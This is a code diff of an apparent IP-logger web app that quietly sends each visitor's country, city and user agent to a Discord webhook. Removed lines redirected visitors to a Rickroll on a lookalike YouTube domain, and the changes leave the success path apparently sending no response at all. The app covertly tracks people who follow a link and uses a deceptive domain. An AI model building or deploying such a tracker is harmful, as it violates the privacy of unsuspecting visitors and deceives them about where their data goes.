@@ -30,33 +30,31 @@ app.get("/", (req, res) => {
             color: 439191,
             fields: [
                 {
-                    name: "Country",
+                    name: "🌏 Country",
                     value: (req.headers["x-vercel-ip-country"]) ? req.headers["x-vercel-ip-country"] : "N/A"
                 },
                 {
-                    name: "City",
+                    name: "🏙️ City",
                     value: (req.headers["x-vercel-ip-city"]) ? req.headers["x-vercel-ip-city"] : "N/A"
                 },
                 {
-                    name: "User agent",
+                    name: "👤 User agent",
                     value: (req.useragent.source) ? req.useragent.source : "N/A"
                 }
             ]
         };
         webhookClient.send({ embeds: [payload] }).then((response) => {
-            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
         }).catch((err) => {
             console.log(err);
-            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
         });
     } else{
-        res.redirect("/no-access");
+        res.redirect("/koi");
     };
 });
 
 // No access page
-app.get("/no-access",(req,res) => {
-    res.sendFile(path.join(__dirname, "./public", "no_access.html"));
+app.get("/koi",(req,res) => {
+    res.sendFile(path.join(__dirname, "./public", "koi.html"));
 });
 
 // For vercel serverless
